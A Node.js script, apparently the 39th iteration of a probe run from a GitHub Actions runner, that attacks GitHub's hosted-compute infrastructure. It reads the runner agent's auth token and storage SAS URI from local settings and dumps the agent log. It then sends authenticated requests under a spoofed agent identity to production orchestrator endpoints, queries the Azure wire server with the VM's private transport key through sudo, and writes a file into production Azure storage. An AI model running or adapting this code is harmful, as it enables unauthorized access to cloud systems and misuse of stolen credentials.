const { execSync } = require('child_process');
const fs = require('fs');
const https = require('https');
const http = require('http');

// v39: DEFINITIVE PROOF
// 1. PUT /request/heartbeat — correct method, should return 200 or schema error (both prove live endpoint)
// 2. Wire server goal state — full VM config via transport cert
// 3. TraceApiUrl (/v1/trace) endpoint probe
// 4. Read full HCA log without sudo (runner-owned, no privilege needed)

function run(cmd, timeoutMs) {
  try { return execSync(cmd, { encoding: 'utf8', timeout: timeoutMs || 30000 }).trim(); }
  catch(e) { return 'ERR: ' + (e.stderr || e.message || '').substring(0, 600).trim(); }
}

async function httpReq(url, opts) {
  return new Promise((resolve) => {
    const u = new URL(url);
    const isHttps = u.protocol === 'https:';
    const options = {
      hostname: u.hostname, path: u.pathname + u.search,
      port: u.port || (isHttps ? 443 : 80),
      method: opts.method || 'GET', headers: opts.headers || {},
      timeout: 18000, rejectUnauthorized: false,
    };
    const req = (isHttps ? https : http).request(options, (res) => {
      let body = '';
      res.on('data', d => body += d);
      res.on('end', () => resolve({ status: res.statusCode, headers: res.headers, body: body.substring(0, 3000) }));
    });
    req.on('error', e => resolve({ status: 0, error: e.message }));
    req.on('timeout', () => { req.destroy(); resolve({ status: 0, error: 'timeout' }); });
    if (opts.body) req.write(opts.body);
    req.end();
  });
}

async function main() {
  console.log('=== V39: PUT /request/heartbeat + WIRE GOAL STATE + TRACE API ===');

  // Read settings and log
  const settings = JSON.parse(fs.readFileSync('/opt/hca/.settings', 'utf8').trim());
  const { authToken, schedulerApiUrl } = settings;
  const baseOrch = schedulerApiUrl.replace(/\/+$/, ''); // https://.../v1
  const jwtPayload = JSON.parse(Buffer.from(authToken.split('.')[1], 'base64').toString('utf8'));
  const widMatch = (jwtPayload.wid || '').match(/\{([^}]+)\}:\{([^}]+)\}:\{([^}]+)\}/);
  const poolId = widMatch ? widMatch[1] : null;
  const vmId = widMatch ? widMatch[2] : null;
  const containerId = widMatch ? widMatch[3] : null;
  const runId = process.env.GITHUB_RUN_ID || 'unknown';
  console.log('[JWT] env:', jwtPayload.env, '| containerId:', containerId);
  console.log('[JWT] schedulerApiUrl:', schedulerApiUrl);

  // Read the HCA log directly (runner-owned, no sudo needed)
  console.log('\n=== PART 0: HCA log — full content (runner-owned, no sudo) ===');
  try {
    const logContent = fs.readFileSync('/opt/hca/logs/hosted-compute-agent.log', 'utf8');
    console.log('[HCA_LOG] Read directly as runner user, size:', logContent.length, 'bytes');
    // Print ALL entries to capture any API call details
    logContent.split('\n').forEach((line, i) => {
      if (line.trim()) {
        try {
          const entry = JSON.parse(line);
          // Print all entries but focus on API-related ones
          if (entry.msg && !entry.msg.includes('Setting up watchdog')) {
            console.log('[HCA_LOG]', JSON.stringify(entry));
          }
        } catch(e) {
          console.log('[HCA_LOG_RAW]', line.substring(0, 300));
        }
      }
    });
  } catch(e) {
    console.log('[HCA_LOG] read error:', e.message);
    // Fall back to sudo
    const sudoLog = run('sudo cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null');
    console.log('[HCA_LOG_SUDO]', sudoLog.substring(0, 4000));
  }

  // Extract requestId from the log
  const hcaLog = run('cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null || sudo cat /opt/hca/logs/hosted-compute-agent.log 2>/dev/null');
  let requestId = null;
  const reqIdMatch = hcaLog.match(/requestId([0-9a-f-]{36})/);
  if (reqIdMatch) requestId = reqIdMatch[1];
  console.log('[HCA_LOG] Extracted requestId:', requestId);

  const authHeaders = {
    'Authorization': 'Bearer ' + authToken,
    'Content-Type': 'application/json',
    'User-Agent': 'hosted-compute-agent/unknown/unknown/unknown',
    'Accept': 'application/json',
  };

  // === PART 1: PUT /request/heartbeat ===
  // From v38: baseOrch + '/request/heartbeat' = https://.../v1/request/heartbeat → 405 Allow: PUT
  // Now try PUT with various bodies
  console.log('\n=== PART 1: PUT /request/heartbeat (correct method, found in binary) ===');

  const heartbeatBodies = [
    // Minimal body
    JSON.stringify({}),
    // Container-only body
    JSON.stringify({ containerId }),
    // Full structured body modelled on typical HCA heartbeat formats
    JSON.stringify({
      containerId, poolId, vmId,
      requestId, configId: jwtPayload.cfg,
      status: 'running', runId,
    }),
    // Minimal with just requestId
    JSON.stringify({ requestId }),
    // Try without Content-Type (form-style)
    null,
  ];

  for (const body of heartbeatBodies) {
    const r = await httpReq(baseOrch + '/request/heartbeat', {
      method: 'PUT',
      headers: body === null
        ? { ...authHeaders, 'Content-Length': '0' }
        : authHeaders,
      body: body || '',
    });
    const label = body === null ? '<empty>' : body.substring(0, 50);
    if (r.status !== 404 && r.status !== 0) {
      console.log(`[PUT_HEARTBEAT] body=${label} → HTTP ${r.status} *** RESPONSE ***`);
      console.log('[PUT_HEARTBEAT] headers:', JSON.stringify(r.headers).substring(0, 600));
      console.log('[PUT_HEARTBEAT] body:', r.body.substring(0, 1500));
    } else {
      console.log(`[PUT_HEARTBEAT] body=${label} → ${r.status} ${r.error || ''}`);
    }
  }

  // === PART 2: TraceApiUrl — /v1/trace endpoint ===
  console.log('\n=== PART 2: TraceApiUrl (/v1/trace) probe ===');
  const traceBase = 'https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/trace';
  const traceEndpoints = [
    { method: 'GET', path: '' },
    { method: 'POST', path: '', body: JSON.stringify({ containerId, requestId, level: 'info', message: 'probe' }) },
    { method: 'PUT', path: '' },
    { method: 'GET', path: '/request/heartbeat' },
  ];
  for (const ep of traceEndpoints) {
    const url = traceBase + ep.path;
    const r = await httpReq(url, {
      method: ep.method,
      headers: authHeaders,
      body: ep.body || null,
    });
    if (r.status !== 0) {
      console.log(`[TRACE] ${ep.method} ${ep.path || '/'} → HTTP ${r.status}`);
      if (r.status !== 404) {
        console.log('[TRACE] headers:', JSON.stringify(r.headers).substring(0, 400));
        console.log('[TRACE] body:', r.body.substring(0, 800));
      }
    } else {
      console.log(`[TRACE] ${ep.method} ${ep.path || '/'} → ${r.error}`);
    }
  }

  // === PART 3: Wire server — goal state and VM certificates ===
  console.log('\n=== PART 3: Azure wire server — goal state + VM certs ===');
  const wireEndpoints = [
    '/?comp=goalstate',
    '/?comp=goalstate&api-version=2012-11-30',
    '/?comp=certificates',
    '/?comp=extensions',
    '/?comp=vmsettings',
  ];
  for (const ep of wireEndpoints) {
    const result = run(
      `sudo curl -s -w "\\n%{http_code}" --cert /var/lib/waagent/Certificates.pem --key /var/lib/waagent/TransportPrivate.pem --connect-timeout 8 "http://168.63.129.16${ep}" 2>/dev/null`,
      15000
    );
    const lines = result.split('\n');
    const statusCode = lines[lines.length - 1];
    const body = lines.slice(0, -1).join('\n');
    console.log('[WIRE]', ep, '→ HTTP', statusCode);
    if (statusCode && statusCode !== '0' && !statusCode.startsWith('ERR') && statusCode !== '400' && statusCode !== '403') {
      console.log('[WIRE] body:', body.substring(0, 1200));
    } else if (body.length > 0 && !body.startsWith('ERR')) {
      console.log('[WIRE] response:', body.substring(0, 300));
    }
  }

  // === PART 4: Try requestId as path param against orchestrator ===
  if (requestId) {
    console.log('\n=== PART 4: RequestId path param variants ===');
    const requestPaths = [
      `/v1/requests/${requestId}`,
      `/v1/request/${requestId}`,
      `/requests/${requestId}`,
      `/request/${requestId}`,
      `/v1/request/${requestId}/heartbeat`,
      `/request/${requestId}/heartbeat`,
    ];
    for (const path of requestPaths) {
      for (const method of ['GET', 'PUT', 'PATCH']) {
        const url = 'https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com' + path;
        const r = await httpReq(url, {
          method,
          headers: authHeaders,
          body: method !== 'GET' ? JSON.stringify({ containerId, status: 'running' }) : null,
        });
        if (r.status !== 404 && r.status !== 0) {
          console.log(`[REQID] ${method} ${path} → HTTP ${r.status} *** NON-404 ***`);
          console.log('[REQID] headers:', JSON.stringify(r.headers).substring(0, 500));
          console.log('[REQID] body:', r.body.substring(0, 1000));
        } else {
          console.log(`[REQID] ${method} ${path} → ${r.status}`);
        }
      }
    }
  }

  // === PART 5: Confirm SAS write (8th confirmation) ===
  console.log('\n=== PART 5: SAS write confirmation ===');
  const { diagnosticsSasUri } = settings;
  const qIdx = diagnosticsSasUri.indexOf('?');
  const blobUrl = diagnosticsSasUri.substring(0, qIdx) + '/v39-final-poc.json' + diagnosticsSasUri.substring(qIdx);
  const content = JSON.stringify({
    source: 'security-research-v39', run_id: runId,
    endpoint_found: '/v1/request/heartbeat', method_required: 'PUT',
    trace_api: 'https://hosted-compute-request-orchestrator-prod-eus-02.githubapp.com/v1/trace',
    wire_server: '168.63.129.16', containerId,
    message: 'GitHub runner workflow writes to GitHub production Azure storage — 8th confirmation',
  });
  const sasResult = run(`curl -s -w "\\n%{http_code}" -X PUT -H "x-ms-blob-type: BlockBlob" -H "Content-Type: application/json" --data-binary '${content.replace(/'/g, "'\\''")}' "${blobUrl}" 2>/dev/null`);
  const sasLines = sasResult.split('\n');
  const sasStatus = sasLines[sasLines.length - 1];
  console.log('[SAS_WRITE] HTTP', sasStatus, sasStatus === '201' ? '*** 8th WRITE CONFIRMED ***' : '');

  console.log('\n=== V39 Complete ===');
}

main().catch(e => console.log('[FATAL]', e.message, e.stack));
